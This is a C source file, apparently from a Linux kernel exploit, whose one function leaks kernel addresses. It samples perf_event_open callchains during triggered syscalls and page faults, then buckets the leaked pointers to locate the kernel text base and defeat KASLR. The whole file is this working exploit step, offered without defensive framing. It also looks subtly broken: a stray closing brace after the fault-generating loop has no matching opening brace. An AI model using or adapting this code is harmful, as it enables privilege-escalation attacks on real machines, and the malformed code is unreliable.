#include "common.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <fcntl.h>


#define PERF_CONTEXT_HV     ((uint64_t)-32)
#define PERF_CONTEXT_KERNEL ((uint64_t)-128)
#define PERF_CONTEXT_USER   ((uint64_t)-512)

static uint64_t rd64(const void *p) { uint64_t v; memcpy(&v, p, sizeof(v)); return v; }

/*
  Decode a PERF_RECORD_SAMPLE payload according to the sample_type flags we
  actually requested.  Do NOT assume a fixed struct: the kernel packs only the
  fields whose PERF_SAMPLE_* bits are set, in a fixed order.
 */
static int parse_sample(const char *rec, uint64_t sample_type, int max_cc,
                        uint64_t *ip_out, uint64_t *cc_out, int *ccn_out) {
    const char *q = rec + 8; /* skip struct perf_event_header */

    if (sample_type & PERF_SAMPLE_IP) {
        *ip_out = rd64(q); q += 8;
    } else {
        *ip_out = 0;
    }
    if (sample_type & PERF_SAMPLE_TID) q += 8;          
    if (sample_type & PERF_SAMPLE_TIME) q += 8;
    if (sample_type & PERF_SAMPLE_ADDR) q += 8;
    if (sample_type & PERF_SAMPLE_ID) q += 8;
    if (sample_type & PERF_SAMPLE_STREAM_ID) q += 8;
    if (sample_type & PERF_SAMPLE_CPU) q += 8;
    if (sample_type & PERF_SAMPLE_PERIOD) q += 8;
    if (sample_type & PERF_SAMPLE_READ) q += 8;

    *ccn_out = 0;
    if (sample_type & PERF_SAMPLE_CALLCHAIN) {
        uint64_t nr = rd64(q); q += 8;
        if (nr > (uint64_t)max_cc) nr = (uint64_t)max_cc;
        for (int i = 0; i < (int)nr; i++) {
            cc_out[i] = rd64(q); q += 8;
        }
        *ccn_out = (int)nr;
    }
    return 0;
}

static int read_tracepoint_id(const char *syscall_name) {
    static const char *paths[] = {
        "/sys/kernel/tracing/events/syscalls/sys_enter_%s/id",
        "/sys/kernel/debug/tracing/events/syscalls/sys_enter_%s/id",
        NULL
    };
    for (int i = 0; paths[i]; i++) {
        char fpath[256];
        snprintf(fpath, sizeof(fpath), paths[i], syscall_name);
        int fd = open(fpath, O_RDONLY);
        if (fd >= 0) {
            char buf[32];
            int n = read(fd, buf, sizeof(buf) - 1);
            close(fd);
            if (n > 0) { buf[n] = 0; int id = atoi(buf); if (id > 0) return id; }
        }
    }
    return 0;
}


static inline int in_text_window(uint64_t v) {
    if (v < KIMAGE_TEXT_BASE) return 0;
    if (v >= VMEMMAP_START) return 0;
    return 1;
}

static inline int is_kernel_space_ptr(uint64_t v) {
    if (v > 0xffffffffffff0000ULL) return 0;
    if (v < 0xffff000000000000ULL) return 0;
    return 1;
}

static int is_valid_kernel_text_base(uint64_t base) {
   // the 1GB-window is wrong for this 48-bit-VA build). 
  if (base & ((1ULL << 21) - 1)) return 0;
  if (base < KIMAGE_TEXT_BASE) return 0;
  if (base >= VMEMMAP_START) return 0;
  return 1;
}

uint64_t getkerneltextstart() {
    int fd = -1;
    const char *strategy = "none";
    int tp_id = 0;
    const uint64_t sample_type =
        PERF_SAMPLE_IP | PERF_SAMPLE_TID | PERF_SAMPLE_CALLCHAIN;

    // Tier 1: syscall tracepoint (if tracefs is readable). 
    tp_id = read_tracepoint_id("getpid");
    if (!tp_id) tp_id = read_tracepoint_id("gettid");
    if (!tp_id) tp_id = read_tracepoint_id("getuid");
    pr_info("slide: tracepoint id=%d\n", tp_id);

    struct perf_event_attr a;
    if (tp_id > 0) {
        memset(&a, 0, sizeof(a));
        a.type           = PERF_TYPE_TRACEPOINT;
        a.size           = sizeof(a);
        a.config         = tp_id;
        a.sample_period  = 1;
        a.sample_type    = sample_type;
        a.sample_max_stack = 24;
        a.disabled       = 1;
        a.exclude_user   = 0;
        a.exclude_kernel = 0;
        a.exclude_hv     = 1;
        fd = syscall(SYS_perf_event_open, &a, 0, -1, -1, 0);
        if (fd >= 0) strategy = "tracepoint";
        else pr_info("slide: tracepoint open failed errno=%d\n", errno);
    }

  
    if (fd < 0) {
        memset(&a, 0, sizeof(a));
        a.type           = PERF_TYPE_SOFTWARE;
        a.size           = sizeof(a);
        a.config         = PERF_COUNT_SW_CPU_CLOCK;
        a.sample_period  = 50000;
        a.sample_type    = sample_type;
        a.sample_max_stack = 24;
        a.disabled       = 1;
        a.exclude_user   = 1;
        a.exclude_kernel = 0;
        a.exclude_hv     = 1;
        fd = syscall(SYS_perf_event_open, &a, 0, -1, -1, 0);
        if (fd >= 0) strategy = "SW_CPU_CLOCK(kern)";
        else pr_info("slide: SW cpu-clock open failed errno=%d\n", errno);
    }

    if (fd < 0) {
        memset(&a, 0, sizeof(a));
        a.type           = PERF_TYPE_HARDWARE;
        a.size           = sizeof(a);
        a.config         = PERF_COUNT_HW_CPU_CYCLES;
        a.sample_period  = 10000;
        a.sample_type    = sample_type;
        a.sample_max_stack = 24;
        a.disabled       = 1;
        a.exclude_user   = 1;
        a.exclude_kernel = 0;
        a.exclude_hv     = 1;
        fd = syscall(SYS_perf_event_open, &a, 0, -1, -1, 0);
        if (fd >= 0) strategy = "HW_CPU_CYCLES";
        else pr_info("slide: HW cycles open failed errno=%d\n", errno);
    }

    if (fd < 0) {
        memset(&a, 0, sizeof(a));
        a.type           = PERF_TYPE_SOFTWARE;
        a.size           = sizeof(a);
        a.config         = PERF_COUNT_SW_PAGE_FAULTS;
        a.sample_period  = 1;
        a.sample_type    = sample_type;
        a.sample_max_stack = 24;
        a.disabled       = 1;
        a.exclude_user   = 0;
        a.exclude_kernel = 0;
        a.exclude_hv     = 1;
        fd = syscall(SYS_perf_event_open, &a, 0, -1, -1, 0);
        if (fd >= 0) strategy = "SW_PAGE_FAULTS";
        else pr_info("slide: SW page-fault open failed errno=%d\n", errno);
    }

    if (fd < 0) {
        pr_warning("slide: all perf_event_open strategies failed\n");
        return 0;
    }
    pr_info("slide: perf strategy=%s tp_id=%d\n", strategy, tp_id);

    int   pg = sysconf(_SC_PAGESIZE);
    size_t sz = (size_t)pg * 33;
    void *b = mmap(NULL, sz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (b == MAP_FAILED) { pr_warning("slide: mmap errno=%d\n", errno); close(fd); return 0; }

    struct perf_event_mmap_page *h = b;
    uint64_t ds = h->data_size;
    if (ds == 0) { pr_warning("slide: data_size=0\n"); munmap(b, sz); close(fd); return 0; }

    // Mark all pre-existing ring data consumed so the walk below is clean. 
    h->data_tail = h->data_head;
    __sync_synchronize();

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);


        volatile char sink = 0;
        size_t chunk = 2 * 1024 * 1024;
        char *buf = mmap(NULL, chunk, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (buf != MAP_FAILED) {
            madvise(buf, chunk, MADV_NOHUGEPAGE);
            for (int round = 0; round < 2000; round++) {
                for (size_t i = 0; i < chunk; i += 4096) sink += buf[i];
                madvise(buf, chunk, MADV_DONTNEED);
                syscall(__NR_gettid);
                syscall(__NR_getpid);
            }
            munmap(buf, chunk);
        }
        (void)sink;
    }

    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
    __sync_synchronize();

    uint64_t hd = h->data_head;
    char    *d  = (char *)b + h->data_offset;

    if (hd == 0) { pr_warning("slide: data_head=0\n"); munmap(b, sz); close(fd); return 0; }
    pr_info("slide: hd=0x%llx ds=0x%llx (laps=%lld)\n",
            (unsigned long long)hd, (unsigned long long)ds,
            (unsigned long long)(hd / ds));

    #define MAX_SAMPLES 500000
    uint64_t *kaddrs  = malloc(MAX_SAMPLES * sizeof(uint64_t));
    int      kcount   = 0;
    int      total_samples = 0;
    uint64_t top16_buckets[256] = {0};

    uint64_t tl = 0;
    while (tl < hd && kcount < MAX_SAMPLES) {
        uint64_t off = tl % ds;
        const struct perf_event_header *hdr =
            (const struct perf_event_header *)(d + off);
        uint32_t hsize = hdr->size;
        if (hsize < sizeof(*hdr) || hsize > ds || tl + hsize > hd) {
            pr_info("slide: stop at tl=%llx hsize=%u\n",
                    (unsigned long long)tl, hsize);
            break;
        }
        tl += hsize;
        if (hdr->type != PERF_RECORD_SAMPLE) continue;
      // skip this ring repetes anywyas
        if (off + hsize > ds) continue;

        uint64_t ip;
        uint64_t cc[24];
        int ccn = 0;
        parse_sample((const char *)hdr, sample_type, 24, &ip, cc, &ccn);

        if (total_samples == 0) {
            pr_info("slide: first sample raw (header size=%u type=%u):\n",
                    hsize, hdr->type);
            const unsigned char *r = (const unsigned char *)hdr;
            for (int row = 0; row < 4; row++) {
                char line[128] = {0}, *lp = line;
                for (int col = 0; col < 8; col++) {
                    int n = 8 + row * 8 + col;
                    if (n < (int)hsize)
                        lp += snprintf(lp, sizeof(line) - (lp - line), " %02x",
                                       r[n]);
                }
                pr_info("    +%02x:%s\n", row * 8, line);
            }
            pr_info("slide: parsed ip=0x%016llx nr=%d cc[0]=0x%016llx cc[1]=0x%016llx cc[2]=0x%016llx\n",
                    (unsigned long long)ip, ccn,
                    ccn > 0 ? (unsigned long long)cc[0] : 0ULL,
                    ccn > 1 ? (unsigned long long)cc[1] : 0ULL,
                    ccn > 2 ? (unsigned long long)cc[2] : 0ULL);
        }

        uint64_t all[25];
        int      ac = 0;
        if (is_kernel_space_ptr(ip)) all[ac++] = ip;
        for (int c = 0; c < ccn; c++)
            if (is_kernel_space_ptr(cc[c])) all[ac++] = cc[c];

        total_samples++;
        for (int i = 0; i < ac && kcount < MAX_SAMPLES; i++) {
            kaddrs[kcount++] = all[i];
            top16_buckets[(all[i] >> 40) & 0xff]++;
        }
    }

    if (kcount == 0) {
        pr_warning("slide: no kernel-space addresses (samples=%d)\n", total_samples);
        free(kaddrs); munmap(b, sz); close(fd); return 0;
    }

    pr_info("slide: samples=%d kaddrs=%d\n", total_samples, kcount);
    pr_info("slide: bucket histogram (bits 47:40):\n");
    for (int i = 0; i < 256; i++)
        if (top16_buckets[i] > 0)
            pr_info("   0x%02x__........ : %llu\n",
                    i, (unsigned long long)top16_buckets[i]);

    uint64_t kmin = ~0ULL, kmax = 0;
    int text_count = 0;
    for (int i = 0; i < kcount; i++) {
        if (kaddrs[i] < kmin) kmin = kaddrs[i];
        if (kaddrs[i] > kmax) kmax = kaddrs[i];
        if (in_text_window(kaddrs[i])) text_count++;
    }
    pr_info("slide: range kmin=0x%llx kmax=0x%llx span=%lldMB text_in_window=%d/%d\n",
            (unsigned long long)kmin, (unsigned long long)kmax,
            (unsigned long long)((kmax - kmin) / (1024 * 1024)),
            text_count, kcount);

    /* Lowest unique addresses, for manual verification. */
    {
        uint64_t uniq[32]; int ucnt = 0;
        for (int i = 0; i < kcount && ucnt < 20; i++) {
            int dup = 0;
            for (int j = 0; j < ucnt; j++)
                if (uniq[j] == kaddrs[i]) { dup = 1; break; }
            if (!dup) uniq[ucnt++] = kaddrs[i];
        }
        for (int i = 1; i < ucnt; i++) {
            uint64_t tmp = uniq[i];
            int j = i - 1;
            while (j >= 0 && uniq[j] > tmp) { uniq[j+1] = uniq[j]; j--; }
            uniq[j+1] = tmp;
        }
        pr_info("slide: lowest unique addresses:\n");
        for (int i = 0; i < ucnt; i++)
            pr_info("   [%2d] 0x%016llx\n", i, (unsigned long long)uniq[i]);
    }

    if (text_count == 0) {
        pr_warning("slide: no samples inside text window\n");
        free(kaddrs); munmap(b, sz); close(fd); return 0;
    }

    /*
     * Build the histogram from text-window addresses only.
     * Kernel text is a tight cluster (the whole .text); its lowest 2MB
     * bucket is the slide base.
     */
    #define BUCKET_SHIFT 21  /* 2MB */
    #define NUM_BUCKETS  4096
    int *hist = calloc(NUM_BUCKETS, sizeof(int));
    uint64_t ktmin = ~0ULL;
    for (int i = 0; i < kcount; i++)
        if (in_text_window(kaddrs[i]) && kaddrs[i] < ktmin) ktmin = kaddrs[i];
    uint64_t base_addr = ktmin & ~((1ULL << BUCKET_SHIFT) - 1);

    for (int i = 0; i < kcount; i++) {
        if (!in_text_window(kaddrs[i])) continue;
        uint64_t off = (kaddrs[i] - base_addr) >> BUCKET_SHIFT;
        if (off < NUM_BUCKETS) hist[off]++;
    }

    int max_hits = 0, max_bucket = 0;
    for (int i = 0; i < NUM_BUCKETS; i++) {
        if (hist[i] > max_hits) { max_hits = hist[i]; max_bucket = i; }
    }

    int threshold = max_hits / 10;
    int first_bucket = -1;
    for (int i = 0; i < NUM_BUCKETS; i++) {
        if (hist[i] > threshold) {
            if (first_bucket < 0) first_bucket = i;
        }
    }

    uint64_t text_start = base_addr + ((uint64_t)first_bucket << BUCKET_SHIFT);

    pr_info("slide: candidate text_start=0x%llx (max_bucket=%d hits=%d thresh=%d)\n",
            (unsigned long long)text_start, max_bucket, max_hits, threshold);

    if (!is_valid_kernel_text_base(text_start)) {
        pr_warning("slide: rejected base=0x%llx (outside KASLR window)\n",
                   (unsigned long long)text_start);
        free(hist);
        free(kaddrs);
        munmap(b, sz);
        close(fd);
        return 0;
    }
    int in_text = 0;
    for (int i = 0; i < kcount; i++) {
        if (kaddrs[i] >= text_start &&
            kaddrs[i] < text_start + 0x4000000ULL) {
            in_text++;
        }
    }
    if (in_text * 2 < kcount) {
        pr_warning("slide: rejected base=0x%llx (only %d/%d samples in text)\n",
                   (unsigned long long)text_start, in_text, kcount);
        free(hist);
        free(kaddrs);
        munmap(b, sz);
        close(fd);
        return 0;
    }

    free(hist);
    free(kaddrs);
    munmap(b, sz);
    close(fd);
    return text_start;
}
